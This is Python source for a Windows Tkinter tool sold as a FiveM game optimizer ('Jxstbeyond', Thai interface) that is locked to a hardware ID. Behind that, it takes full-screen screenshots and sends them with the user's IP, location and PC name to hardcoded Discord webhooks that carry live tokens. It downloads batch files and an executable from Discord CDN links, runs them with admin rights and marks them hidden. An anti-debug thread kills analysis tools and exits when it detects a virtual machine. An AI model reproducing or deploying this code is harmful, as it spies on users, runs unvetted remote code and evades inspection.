def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
def run_as_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)

def _on_close():
        try:
            print("remove...")    
            os.remove(f'C:/Users/Public/Videos/Backup_System.bat')
            os.remove(f'C:/Users/Public/Videos/Beyonder_Punch.bat')
            os.remove(f'C:/Users/Public/Videos/Celestials_Puch.bat')
            os.remove(f'C:/Users/Public/Videos/Entity_Punch.bat')
            os.remove(f'C:/Users/Public/Videos/Hermes_God.bat')
            os.remove(f'C:/Users/Public/Videos/Boost_FPS.bat')
            os.remove(f'C:/Users/Public/Videos/Install_Powerplan.bat')
            os.remove(f'C:/Users/Public/Videos/Low_ping.bat')
            os.remove(f'C:/Users/Public/Videos/Clear_All_Temp.bat')
            
            os.remove(f'C:/Users/Public/Videos/fixerror.exe')
            os.remove(f'C:/Users/Public/Videos/RunSuperiorPunching.bat')
            os.remove(f'C:/Users/Public/Videos/RunUnbeatableNetwork.bat')
            os.remove(f'C:/Users/Public/Videos/Y2KREALPUNCH.bat')
            os.remove(f'C:/Users/Public/Videos/J3Ke3NEtwork.bat')
            os._exit(1)
        except Exception as e:
            print("Exception:", e)
        finally:
            print("except exit ...")
            os._exit(1)
class AntiDebug(Thread):
    print("AntiDebug thread is running...")
    def __init__(self):
        self.debigging = True
        Thread.__init__(self)

    def detect_vm(self):
        
        if (hasattr(sys, 'real_prefix')):
            sys.exit(0)

    def detect_core(self):
        
        if (cpu_count() == 1):
            sys.exit(0)

    def check_for_process(self):
        for proc in process_iter():
            try:
                for name in ['proxifier', 'graywolf', 'extremedumper', 'cheatengine', 'zed', 'exeinfope', 'dnspy', 'ilspy', 'titanhide', 'x32dbg', 'codecracker', 'simpleassembly', 'process hacker 2', 'pc-ret', 'http debugger', 'Centos', 'process monitor', 'debug', 'reverse', 'simpleassemblyexplorer', 'de4dotmodded', 'dojandqwklndoqwd-x86', 'sharpod', 'folderchangesview', 'fiddler', 'die', 'pizza', 'crack', 'strongod', 'ida -', 'brute', 'dump', 'StringDecryptor', 'wireshark', 'debugger', 'httpdebugger', 'gdb', 'kdb', 'x64_dbg', 'windbg', 'x64netdumper', 'petools', 'scyllahide', 'megadumper', 'reversal', 'ksdumper v1.1 - by equifox', 'dbgclr', 'HxD', 'monitor', 'peek', 'ollydbg', 'ksdumper', 'http', 'wpe pro', 'dbg', 'httpanalyzer', 'httpdebug', 'PhantOm', 'kgdb', 'james', 'x32_dbg', 'proxy', 'phantom', 'mdbg', 'WPE PRO', 'system explorer', 'de4dot', 'x64dbg', 'protection_id', 'charles', 'systemexplorer', 'pepper', 'hxd', 'procmon64', 'MegaDumper', 'ghidra', 'xd', '0harmony', 'dojandqwklndoqwd', 'hacker', 'process hacker', 'SAE', 'mdb', 'checker', 'harmony', 'Protection_ID', 'x96dbg', 'systemexplorerservice', 'folder', 'mitmproxy', 'dbx', 'sniffer', 'regmon', 'diskmon', 'procmon', 'http', 'traffic', 'packet', 'debuger', 'dbg', 'ida', 'dumper', 'pestudio', 'hacker', "vboxservice.exe","vboxtray.exe","vmtoolsd.exe","vmwaretray.exe","vmwareuser","VGAuthService.exe","vmacthlp.exe","vmsrvc.exe","vmusrvc.exe","prl_cc.exe","prl_tools.exe","xenservice.exe","qemu-ga.exe","joeboxcontrol.exe","joeboxserver.exe","joeboxserver.exe"]:
                    if name.lower() in proc.name().lower():
                        try:
                            proc.kill()
                            os._exit(1)
                        except: sys.exit(0)
            except (NoSuchProcess, AccessDenied, ZombieProcess):
                sys.exit(0)

    def check_for_debugger(self):
        
        if (windll.kernel32.IsDebuggerPresent() != 0 or windll.kernel32.CheckRemoteDebuggerPresent(
                windll.kernel32.GetCurrentProcess(), False) != 0):
            sys.exit()

    def detect_screen_syze(self):
        
        if (windll.user32.GetSystemMetrics(0) <= 200 or windll.user32.GetSystemMetrics(1) <= 200):
            sys.exit()
            
    def detect_server(self):
        if platform.system() == 'Linux':
            print("Running on a Linux server.")
        elif platform.system() == 'Windows':
            print("Running on a Windows.")
        elif platform.system() == 'Darwin':
            print("Running on a macOS server.")
        else:
            print("Running on an unknown system.")

    def run(self):
        try:
            self.detect_screen_syze()
            self.detect_core()
            self.detect_vm()
            self.detect_server()

            while self.debigging:
                self.check_for_process()
                self.check_for_debugger()   
        except Exception as e:
            print(f"Error in AntiDebug thread: {e}")
            
anti_debug_thread = AntiDebug()

def generate_hwid():
    uuid = subprocess.check_output('wmic csproduct get uuid', shell=False).decode().strip()
    hashed_hwid = hashlib.sha256(uuid.encode()).hexdigest()
    return hashed_hwid
def gethwid():
    blist = []
    uuid = subprocess.check_output('wmic csproduct get uuid', shell=False).decode()
    uuid = uuid.strip().split('\r\n')
    blist.append(uuid[1])
    blist = json.dumps(blist, ensure_ascii=False).encode('utf-8')
    blist = b'Jxstbeyond' + base64.b64encode(blist)
    return blist.decode('UTF-8')

new_hwid = generate_hwid()[:16]
hw = gethwid()[:15]
mypcname = os.getlogin()
NameProject = ("Jxstbeyond-By-Jenos")
Version = ("1.8")
hwiduuid = f'''{NameProject} [{hw}-{mypcname}-{new_hwid}]''' 
ipinfo = requests.get('https://ipinfo.io/json')
ipinfojson = ipinfo.json()
ip = ipinfojson.get('ip')
city = ipinfojson.get('city')
country = ipinfojson.get('country')
region = ipinfojson.get('region')
org = ipinfojson.get('org')
loc = ipinfojson.get('loc')
webhookusercanlogin = "https://discord.com/api/webhooks/1181313026817790023/APGovruQqp3fViaZ901ml8KwK2rShHWr28DjBTVLFkHV9fp6zGb4ziItuzT_qBV9kHjm"
webhookusercantlogin = "https://discord.com/api/webhooks/1181313084594323578/Oh29JLchHDlqJ0CnVjz4QxyjJIEqxXtxVB5XWLEMLrBo9TMBwDYdn3i23kXyE0PlQPXZ"
usercanlogin = f"คุณ {mypcname} ได้เข้าระบบสำเร็จ" 
usercantlogin = f"คุณ {mypcname} ได้เข้าระบบไม่สำเร็จ" 



def datahwidreg() -> str:
    http = urllib3.PoolManager()
    response = http.request('GET', 'https://pastebin.com/raw/Wt4rezud')
    return response.data.decode()

def discordusercanlogin():
    image = ImageGrab.grab(bbox=None,include_layered_windows=True,all_screens=True,xdisplay=None)  
    image.save("imageprpsecurity.png")
    webhookusercanloginpic = DiscordWebhook(webhookusercanlogin, username=usercanlogin)
    with open("imageprpsecurity.png", "rb") as f:
        webhookusercanloginpic.add_file(file=f.read(), filename='imageprpsecurity.png')
    os.remove("imageprpsecurity.png")
    httpx.post(
        webhookusercanlogin, json={
        "content":"",
        "embeds": [
        {
            "title": f"User : {mypcname}",
            "tts": False,
            "description": f"""Project : {NameProject} 
                Version : {Version} 
                Status : เข้าระบบสำเร็จ 
                HWID : {hwiduuid}
                IP : {ip}
                โลเคชั่น : {loc}
                ระบบปฎิบัติการที่ใช้เปิดโปรแกรม : {platform.platform()}""",
            "color": 0x1cff00,
        }
        ],
        "username": usercanlogin,
        }
    )
    response = webhookusercanloginpic.execute()

def discordusercantlogin():
      image = ImageGrab.grab(bbox=None,include_layered_windows=True,all_screens=True,xdisplay=None)  
      image.save("imageprpsecuritycantlogin.png")
      webhookusercantloginpic = DiscordWebhook(webhookusercantlogin, username=usercantlogin)
      with open("imageprpsecuritycantlogin.png", "rb") as f:
        webhookusercantloginpic.add_file(file=f.read(), filename='imageprpsecuritycantlogin.png')
      os.remove("imageprpsecuritycantlogin.png")
      httpx.post(
            webhookusercantlogin, json={
            "content":"",
            "embeds": [
            {
              "title": f"User : {mypcname}",
              "tts": False,
              "description": f"""Project : {NameProject} 
                Version : {Version} 
                Status : เข้าระบบสำเร็จ 
                HWID : {hwiduuid}
                IP : {ip}
                โลเคชั่น : {loc}
                ระบบปฎิบัติการที่ใช้เปิดโปรแกรม : {platform.platform()}""",
              "color": 0xcf0a0a,
            }
          ],
          "username": usercantlogin,
          }
        )
      response = webhookusercantloginpic.execute()

files_to_remove = [
    'C:/Users/Public/Videos/Backup_System.bat',
    'C:/Users/Public/Videos/Beyonder_Punch.bat',
    'C:/Users/Public/Videos/Celestials_Puch.bat',
    'C:/Users/Public/Videos/Entity_Punch.bat',
    'C:/Users/Public/Videos/Hermes_God.bat',
    'C:/Users/Public/Videos/Boost_FPS.bat',
    'C:/Users/Public/Videos/Install_Powerplan.bat',
    'C:/Users/Public/Videos/Low_ping.bat',
    'C:/Users/Public/Videos/Clear_All_Temp.bat',
    'C:/Users/Public/Videos/fixerror.exe',
    'C:/Users/Public/Videos/RunSuperiorPunching.bat',
    'C:/Users/Public/Videos/RunUnbeatableNetwork.bat',
    'C:/Users/Public/Videos/Y2KREALPUNCH.bat',
    'C:/Users/Public/Videos/J3Ke3NEtwork.bat'
]

def page_login ():
    
    def hwidprogram(event):
        http = urllib3.PoolManager()
        hwid_data = datahwidreg()
        if hwiduuid in hwid_data:
            window_login.destroy()
            discordusercanlogin()
            page_one()
            print("Login success")
        else:
            discordusercantlogin()
            messagebox.showerror("PRP - Sercurity", "Failed! \n Invalid HWID!")
            print("Login faill")
            print(hwiduuid)
    def copy_text(event):
            text = hwiduuid
            pyperclip.copy(text)
            messagebox.showinfo("PRP - Sercurity", "คัดลอก HWID Completed !")
    def exit_programe(event):
        print("Closing the program.")
        window_login.destroy()
        _on_close()
        sys.exit(0)
        
    for file_path in files_to_remove:
        if os.path.exists(file_path):
            os.remove(file_path)
            print(f"File {file_path} has been removed.")
        else:
            print(f"File {file_path} not found.")
            window_login = Tk()
            window_login.protocol("WM_DELETE_WINDOW", _on_close)
            logo = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181251569539366962/1181327366409179167/logo.png?ex=6580a7d8&is=656e32d8&hm=091b9d5c0ba456d4ad65b1522dd5a2ea6ad5970309d75e1fa07d7da18f3ccaa8&", stream=True).raw))
            window_login.iconphoto(False,logo)

            window_login.configure(bg = "#C4C4C4")
            width_of_window_login = 260
            height_of_window_login = 290
            labels = []  
            screen_width = window_login.winfo_screenwidth()
            screen_height = window_login.winfo_screenheight()
            x_coordinate = (screen_width/2)-(width_of_window_login/2)
            y_coordinate = (screen_height/2)-(height_of_window_login/2)
            window_login.geometry("%dx%d+%d+%d" %(width_of_window_login,height_of_window_login,x_coordinate,y_coordinate))
            window_login.overrideredirect(1) 
            window_login.resizable(False, False)   
            window_login.attributes('-topmost', 1)


            canvas = Canvas(window_login,bg = "#C4C4C4",height = 290,width = 260,bd = 0,highlightthickness = 0,relief = "ridge")

            canvas.place(x = 0, y = 0)

            image_image_2 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181175855435763784/1181175889631907860/image_2.png?ex=65801ac5&is=656da5c5&hm=4c6e448725f0e155a7124870bef8ed4c43595ab14bfcbef8aa0a19bfee9e31b9&", stream=True).raw))
            image_2 = canvas.create_image(130.0,52.0,image=image_image_2)

            image_image_3 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181175855435763784/1181175900801351731/image_3.png?ex=65801ac7&is=656da5c7&hm=73d6bd3e4e62fdfedfa8beccfe2af190f0e61124a430ec7f3e397ebb279c77eb&", stream=True).raw))
            image_3 = canvas.create_image(130.0,127.0,image=image_image_3)

            Button_image_image_4 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181175855435763784/1181175925451268126/image_4.png?ex=65801acd&is=656da5cd&hm=9234de8a5322b76682e4b9626c1b1853a55af194706ede884a21744b2f5cdaa2&", stream=True).raw))
            Button_image_4 = canvas.create_image(130.0,216.0,image=Button_image_image_4)
            canvas.tag_bind(Button_image_4, '<Button-1>', copy_text)

            Button_image_image_5 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181175855435763784/1181175939401527326/image_5.png?ex=65801ad1&is=656da5d1&hm=823c87ee34f41edf4cc3679492930f72aba118b29a65c17c98ee88f244cda23e&", stream=True).raw))
            Button_image_5 = canvas.create_image(130.0,184.0,image=Button_image_image_5)
            canvas.tag_bind(Button_image_5, '<Button-1>', hwidprogram)

            Button_image_image_6 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181175855435763784/1181175948276682793/image_6.png?ex=65801ad3&is=656da5d3&hm=795ad5f7b6e5a31b5b884831d2e12305c343ef33040e73695a11d3015772da42&", stream=True).raw))
            Button_image_6 = canvas.create_image(130.0,260.0,image=Button_image_image_6)
            canvas.tag_bind(Button_image_6, '<Button-1>', exit_programe)

            Button_image_image_7 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181175855435763784/1181175957751603200/image_7.png?ex=65801ad5&is=656da5d5&hm=20f168a63f5ac8657b161940d2591891540fc6487cdf489a4ddf1e5f17f72b92&", stream=True).raw))
            Button_image_7 = canvas.create_image(234.0,26.0,image=Button_image_image_7) 
            canvas.tag_bind(Button_image_7, '<Button-1>', exit_programe)
    
            window_login.resizable(False, False)
            window_login.mainloop()

def cmdset1(event):
        mystr_encoded = "https://cdn.discordapp.com/attachments/1181251569539366962/1181272715127173200/Backup_System.bat?ex=658074f2&is=656dfff2&hm=59aa0be49148a01ea3fb205f85fb8ae30190f648b54d7a79475e3fc568cf76ef&"
        if is_admin():
            try:
                os.startfile(f'C:/Users/Public/Videos/Backup_System.bat')
                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
            except:
                with open(f'C:/Users/Public/Videos/Backup_System.bat', 'wb') as f:
                    f.write(requests.get(mystr_encoded).content)
                os.startfile(f'C:/Users/Public/Videos/Backup_System.bat')
                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")

            _doHideBatch = os.popen(f'attrib +h C:/Users/Public/Videos/Backup_System.bat')
            _doHideBatch.read()
            _doHideBatch.close() 
        else:
            run_as_admin()
def fixerror(event):
    mystr_encoded = "https://cdn.discordapp.com/attachments/1181251569539366962/1181831300525588500/fixerror.exe?ex=65827d2b&is=6570082b&hm=6aa7380b3ff99693d4eaec5cf3d1ff914268173683cf8882caa0421bfc643101&"
    
    if is_admin():
        try:
            os.startfile(f'C:/Users/Public/Videos/fixerror.exe')
            messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งาน รอให้โปรแกรมทำงานเสร็จแล้วกดตัวต่อไป")
        except:
            with open(f'C:/Users/Public/Videos/fixerror.exe', 'wb') as f:
                f.write(requests.get(mystr_encoded).content)
            os.startfile(f'C:/Users/Public/Videos/fixerror.exe')
            messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งาน รอให้โปรแกรมทำงานเสร็จแล้วกดตัวต่อไป")

            _doHideBatch = os.popen(f'attrib +h C:/Users/Public/Videos/fixerror.exe')
            _doHideBatch.read()
            _doHideBatch.close()
    else:
        run_as_admin()
def cmdset1_jenos(event):
        mystr_encoded = "https://cdn.discordapp.com/attachments/1181251569539366962/1181272773969051658/Beyonder_Punch.bat?ex=65807500&is=656e0000&hm=af9f864359b4e601b0772ab01c04898ad375bc985055c9c7ac7e7c0e4ffe20c8&"
        if is_admin():    
            try:
                os.startfile(f'C:/Users/Public/Videos/Beyonder_Punch.bat')
                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
            except:
                with open(f'C:/Users/Public/Videos/Beyonder_Punch.bat', 'wb') as f:
                    f.write(requests.get(mystr_encoded).content)
                os.startfile(f'C:/Users/Public/Videos/Beyonder_Punch.bat')
                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")

                _doHideBatch = os.popen(f'attrib +h C:/Users/Public/Videos/Beyonder_Punch.bat')
                _doHideBatch.read()
                _doHideBatch.close()
        else:
            run_as_admin()
def cmdset2_jenos(event):
    
        mystr_encoded = "https://cdn.discordapp.com/attachments/1181251569539366962/1181272774396891136/Celestials_Puch.bat?ex=65807500&is=656e0000&hm=f7e99baf965464d199071d520815d0e9bfb9bf2c6b39f752a98817025600188d&"
        if is_admin(): 
            try:
                os.startfile(f'C:/Users/Public/Videos/Celestials_Puch.bat')
                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
            except:
                with open(f'C:/Users/Public/Videos/Celestials_Puch.bat', 'wb') as f:
                    f.write(requests.get(mystr_encoded).content)
                os.startfile(f'C:/Users/Public/Videos/Celestials_Puch.bat')
                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")

                _doHideBatch = os.popen(f'attrib +h C:/Users/Public/Videos/Celestials_Puch.bat')
                _doHideBatch.read()
                _doHideBatch.close()
        else:
            run_as_admin()
def cmdset3_jenos(event):
        mystr_encoded = "https://cdn.discordapp.com/attachments/1181251569539366962/1182280485318180884/Entity_Punch.bat?ex=65841f81&is=6571aa81&hm=3dd85fb41b4f197935d8163ba67899ff4e5b16868c27f69f78d71840a8112ee2&"
        if is_admin(): 
            try:
                os.startfile(f'C:/Users/Public/Videos/Entity_Punch.bat')
                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
            except:
                with open(f'C:/Users/Public/Videos/Entity_Punch.bat', 'wb') as f:
                    f.write(requests.get(mystr_encoded).content)
                os.startfile(f'C:/Users/Public/Videos/Entity_Punch.bat')
                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")

                _doHideBatch = os.popen(f'attrib +h C:/Users/Public/Videos/Entity_Punch.bat')
                _doHideBatch.read()
                _doHideBatch.close()
        else:
            run_as_admin()
def cmdset4_jenos(event):
        mystr_encoded = "https://cdn.discordapp.com/attachments/1181251569539366962/1181272773629329448/Hermes_God.bat?ex=65807500&is=656e0000&hm=911a0b3944ba695756db7a78588b09f1366c252adb9d15b9405501d640af568f&"
        if is_admin(): 
            try:
                os.startfile(f'C:/Users/Public/Videos/Hermes_God.bat')
                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
            except:
                with open(f'C:/Users/Public/Videos/Hermes_God.bat', 'wb') as f:
                    f.write(requests.get(mystr_encoded).content)
                os.startfile(f'C:/Users/Public/Videos/Hermes_God.bat')
                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")

                _doHideBatch = os.popen(f'attrib +h C:/Users/Public/Videos/Hermes_God.bat')
                _doHideBatch.read()
                _doHideBatch.close()
        else:
            run_as_admin()
def RunSuperiorPunching(event):
        mystr_encoded = "https://cdn.discordapp.com/attachments/1181251569539366962/1181918319205416980/RunSuperiorPunching.bat?ex=6582ce36&is=65705936&hm=19848aee167dd63bc643b961b8fe72b01f7654180bace8c9839c28ade8664d17&"
        if is_admin(): 
            try:
                os.startfile(f'C:/Users/Public/Videos/RunSuperiorPunching.bat')
                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
            except:
                with open(f'C:/Users/Public/Videos/RunSuperiorPunching.bat', 'wb') as f:
                    f.write(requests.get(mystr_encoded).content)
                os.startfile(f'C:/Users/Public/Videos/RunSuperiorPunching.bat')
                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")

                _doHideBatch = os.popen(f'attrib +h C:/Users/Public/Videos/RunSuperiorPunching.bat')
                _doHideBatch.read()
                _doHideBatch.close()
        else:
            run_as_admin()

def RunUnbeatableNetwork(event):
        mystr_encoded = "https://cdn.discordapp.com/attachments/1181251569539366962/1181918319511613561/RunUnbeatableNetwork.bat?ex=6582ce36&is=65705936&hm=ae204501010896df377e0ef3d57a0b27c79f9cf218d09855a04ef711e1e3520a&"
        if is_admin(): 
            try:
                os.startfile(f'C:/Users/Public/Videos/RunUnbeatableNetwork.bat')
                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
            except:
                with open(f'C:/Users/Public/Videos/RunUnbeatableNetwork.bat', 'wb') as f:
                    f.write(requests.get(mystr_encoded).content)
                os.startfile(f'C:/Users/Public/Videos/RunUnbeatableNetwork.bat')
                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")

                _doHideBatch = os.popen(f'attrib +h C:/Users/Public/Videos/RunUnbeatableNetwork.bat')
                _doHideBatch.read()
                _doHideBatch.close()
        else:
            run_as_admin()

def Y2KREALPUNCH(event):
        mystr_encoded = "https://cdn.discordapp.com/attachments/1181251569539366962/1181918319826178128/Y2KREALPUNCH.bat?ex=6582ce36&is=65705936&hm=aaaf5e603791e9695e0ed274e89ce708b4e6f7af7ba30e84e980553b60538619&"
        if is_admin(): 
            try:
                os.startfile(f'C:/Users/Public/Videos/Y2KREALPUNCH.bat')
                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
            except:
                with open(f'C:/Users/Public/Videos/Y2KREALPUNCH.bat', 'wb') as f:
                    f.write(requests.get(mystr_encoded).content)
                os.startfile(f'C:/Users/Public/Videos/Y2KREALPUNCH.bat')
                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")

                _doHideBatch = os.popen(f'attrib +h C:/Users/Public/Videos/Y2KREALPUNCH.bat')
                _doHideBatch.read()
                _doHideBatch.close()
        else:
            run_as_admin()
def J3Ke3NEtwork(event):
        mystr_encoded = "https://cdn.discordapp.com/attachments/1181251569539366962/1181918320149135370/J3Ke3NEtwork.bat?ex=6582ce36&is=65705936&hm=38d55d1972ac2d3b8955ad3a2470d3c91dc89405d28fc3efeb30ae5a03494654&"
        if is_admin(): 
            try:
                os.startfile(f'C:/Users/Public/Videos/J3Ke3NEtwork.bat')
                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
            except:
                with open(f'C:/Users/Public/Videos/J3Ke3NEtwork.bat', 'wb') as f:
                    f.write(requests.get(mystr_encoded).content)
                os.startfile(f'C:/Users/Public/Videos/J3Ke3NEtwork.bat')
                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")

                _doHideBatch = os.popen(f'attrib +h C:/Users/Public/Videos/J3Ke3NEtwork.bat')
                _doHideBatch.read()
                _doHideBatch.close()
        else:
            run_as_admin()

def cmdset1_Optimite(event):
        mystr_encoded = "https://cdn.discordapp.com/attachments/1181251569539366962/1181272713680126103/Boost_FPS.bat?ex=658074f1&is=656dfff1&hm=47718f3c679268f999283bb5d66ee9b480221ba046835c9271da048dba3f655e&"
        if is_admin(): 
            try:
                os.startfile(f'C:/Users/Public/Videos/Boost_FPS.bat')
                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
            except:
                with open(f'C:/Users/Public/Videos/Boost_FPS.bat', 'wb') as f:
                    f.write(requests.get(mystr_encoded).content)
                os.startfile(f'C:/Users/Public/Videos/Boost_FPS.bat')
                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")

                _doHideBatch = os.popen(f'attrib +h C:/Users/Public/Videos/Boost_FPS.bat')
                _doHideBatch.read()
                _doHideBatch.close()
        else:
            run_as_admin()
def cmdset2_Optimite(event):
        mystr_encoded = "https://cdn.discordapp.com/attachments/1181251569539366962/1181304694522527754/Install_Powerplan.bat?ex=658092ba&is=656e1dba&hm=1bfe2062967f8f6532833cd76a24015df868a8b26030edd6a4310cd472565d97&"
        if is_admin(): 
            try:
                os.startfile(f'C:/Users/Public/Videos/Install_Powerplan.bat')
                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
            except:
                with open(f'C:/Users/Public/Videos/Install_Powerplan.bat', 'wb') as f:
                    f.write(requests.get(mystr_encoded).content)
                os.startfile(f'C:/Users/Public/Videos/Install_Powerplan.bat')
                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")

                _doHideBatch = os.popen(f'attrib +h C:/Users/Public/Videos/Install_Powerplan.bat')
                _doHideBatch.read()
                _doHideBatch.close()
        else:
            run_as_admin()
def cmdset3_Optimite(event):
        mystr_encoded = "https://cdn.discordapp.com/attachments/1181251569539366962/1181272714816782416/Low_ping.bat?ex=658074f2&is=656dfff2&hm=ebc8c2112a99c62f9b9754b42f72b49b552241df963c573360675eea6fd5cc0a&"
        if is_admin(): 
            try:
                os.startfile(f'C:/Users/Public/Videos/Low_ping.bat')
                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
            except:
                with open(f'C:/Users/Public/Videos/Low_ping.bat', 'wb') as f:
                    f.write(requests.get(mystr_encoded).content)
                os.startfile(f'C:/Users/Public/Videos/Low_ping.bat')
                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")

                _doHideBatch = os.popen(f'attrib +h C:/Users/Public/Videos/Low_ping.bat')
                _doHideBatch.read()
                _doHideBatch.close()
        else:
            run_as_admin()
def cmdset4_Optimite(event):
        mystr_encoded = "https://cdn.discordapp.com/attachments/1181251569539366962/1181272714124734564/Clear_All_Temp.bat?ex=658074f2&is=656dfff2&hm=cf5be15f6f066790c92d3d84239f3d751fd66cc2dcf645f19d6cff8c82e223eb&"
        if is_admin(): 
            try:
                os.startfile(f'C:/Users/Public/Videos/Clear_All_Temp.bat')
                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
            except:
                with open(f'C:/Users/Public/Videos/Clear_All_Temp.bat', 'wb') as f:
                    f.write(requests.get(mystr_encoded).content)
                os.startfile(f'C:/Users/Public/Videos/Clear_All_Temp.bat')
                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")

                _doHideBatch = os.popen(f'attrib +h C:/Users/Public/Videos/Clear_All_Temp.bat')
                _doHideBatch.read()
                _doHideBatch.close()
        else:
            run_as_admin()

def facebook(event):
    messagebox.showinfo("PRP - Sercurity", "หากโปรแกรมมีปัญหาสามารถติดต่อได้ทั้งสองเฟส")
    webbrowser.open("https://www.facebook.com/jenosdiff")
    webbrowser.open("https://www.facebook.com/GaixrdekJxstbeyond")
def discord(event):
    messagebox.showinfo("PRP - Sercurity", "หากโปรแกรมมีปัญหา หรือ อยากสั่งทำ \n สามารถมาติดต่อได้ที่ดิสคอร์ส")
    webbrowser.open("https://discord.gg/eHMmneSs3c")
def warring(event):
    messagebox.showerror("PRP - Sercurity", "โปรแกรมนี้จะถูกเปิดให้ใช้เร็วๆนี้ ")
def warring_page(event):
    messagebox.showerror("PRP - Sercurity", "คุณอยู่ในหน้าต่างนี้อยู่แล้ว ")
def join_page_one(event):
    files_to_remove = [
    'C:/Users/Public/Videos/Backup_System.bat',
    'C:/Users/Public/Videos/Beyonder_Punch.bat',
    'C:/Users/Public/Videos/Celestials_Puch.bat',
    'C:/Users/Public/Videos/Entity_Punch.bat',
    'C:/Users/Public/Videos/Hermes_God.bat',
    'C:/Users/Public/Videos/Boost_FPS.bat',
    'C:/Users/Public/Videos/Install_Powerplan.bat',
    'C:/Users/Public/Videos/Low_ping.bat',
    'C:/Users/Public/Videos/Clear_All_Temp.bat',
    'C:/Users/Public/Videos/fixerror.exe',
    'C:/Users/Public/Videos/RunSuperiorPunching.bat',
    'C:/Users/Public/Videos/RunUnbeatableNetwork.bat',
    'C:/Users/Public/Videos/Y2KREALPUNCH.bat',
    'C:/Users/Public/Videos/J3Ke3NEtwork.bat'
     ]

    for file_path in files_to_remove:
        try:
            os.remove(file_path)
            print(f'Removed: {file_path}')
        except FileNotFoundError:
           print(f'File not found: {file_path}')
        except Exception as e:
            print(f'Error deleting {file_path}: {e}')
    window_two.destroy()
    page_one()
def join_page_two(event):
    files_to_remove = [
    'C:/Users/Public/Videos/Backup_System.bat',
    'C:/Users/Public/Videos/Beyonder_Punch.bat',
    'C:/Users/Public/Videos/Celestials_Puch.bat',
    'C:/Users/Public/Videos/Entity_Punch.bat',
    'C:/Users/Public/Videos/Hermes_God.bat',
    'C:/Users/Public/Videos/Boost_FPS.bat',
    'C:/Users/Public/Videos/Install_Powerplan.bat',
    'C:/Users/Public/Videos/Low_ping.bat',
    'C:/Users/Public/Videos/Clear_All_Temp.bat',
    'C:/Users/Public/Videos/fixerror.exe',
    'C:/Users/Public/Videos/RunSuperiorPunching.bat',
    'C:/Users/Public/Videos/RunUnbeatableNetwork.bat',
    'C:/Users/Public/Videos/Y2KREALPUNCH.bat',
    'C:/Users/Public/Videos/J3Ke3NEtwork.bat'
     ]

    for file_path in files_to_remove:
        try:
            os.remove(file_path)
            print(f'Removed: {file_path}')
        except FileNotFoundError:
           print(f'File not found: {file_path}')
        except Exception as e:
            print(f'Error deleting {file_path}: {e}')
    window_one.destroy()
    page_two()

def page_one ():

    global window_one
    window_one = Tk()
    window_one.protocol("WM_DELETE_WINDOW", _on_close)
    window_one.title(f"Jxstbeyond Settings | User : {mypcname} | Fivem Setting | PRP - Sercurity")
    logo = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181251569539366962/1181327366409179167/logo.png?ex=6580a7d8&is=656e32d8&hm=091b9d5c0ba456d4ad65b1522dd5a2ea6ad5970309d75e1fa07d7da18f3ccaa8&", stream=True).raw))
    window_one.iconphoto(False,logo)

    window_one.configure(bg = "#111827")
    width_of_window_login = 700
    height_of_window_login = 500
    labels = []  
    screen_width = window_one.winfo_screenwidth()
    screen_height = window_one.winfo_screenheight()
    x_coordinate = (screen_width/2)-(width_of_window_login/2)
    y_coordinate = (screen_height/2)-(height_of_window_login/2)
    window_one.geometry("%dx%d+%d+%d" %(width_of_window_login,height_of_window_login,x_coordinate,y_coordinate))
    window_one.resizable(False, False)   
